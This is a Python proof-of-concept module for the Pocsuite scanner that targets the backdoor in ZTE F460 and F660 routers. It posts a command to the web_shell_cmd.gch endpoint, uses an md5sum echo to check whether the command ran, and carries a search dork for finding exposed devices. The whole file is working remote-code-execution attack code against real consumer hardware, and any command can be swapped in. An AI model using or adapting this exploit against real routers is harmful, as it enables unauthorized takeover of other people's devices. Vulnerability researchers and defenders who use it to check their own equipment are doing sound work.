#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import random
import hashlib
import string



class TestPOC(POCBase):
    name = "ZTE F460 & F660 Backdoor RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'RCE'
    version = '1.0'  # default version: 1.0
    references = 'https://community.rapid7.com/community/infosec/blog/2014/03/04/disclosure-r7-2013-18-zte-f460-and-zte-f660-webshellcmdgch-backdoor'
    desc = 'Exploits ZTE F460 and F660 backdoor vulnerability that allows executing commands on operating system level.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'ZTE'
    appVersion = 'F460&F660'
    dork = '+app:"ZTE F660 router "'
    appPowerLink = ''
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        a = ''.join(random.sample(string.ascii_letters + string.digits, 6))
        md5 = hashlib.md5()
        md5.update(a)
        md5hash = md5.hexdigest()
        cmd = "echo -n {}|md5sum".format(a)
        url = "{}/web_shell_cmd.gch".format(self.url)
        headers = {u'Content-Type': u'multipart/form-data'}
        data = {'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
                'Cmd': cmd,
                'CmdAck': ''}
        resp = req.post(url,data=data,headers=headers)

        if resp.status_code == 200 and md5hash in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url



        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
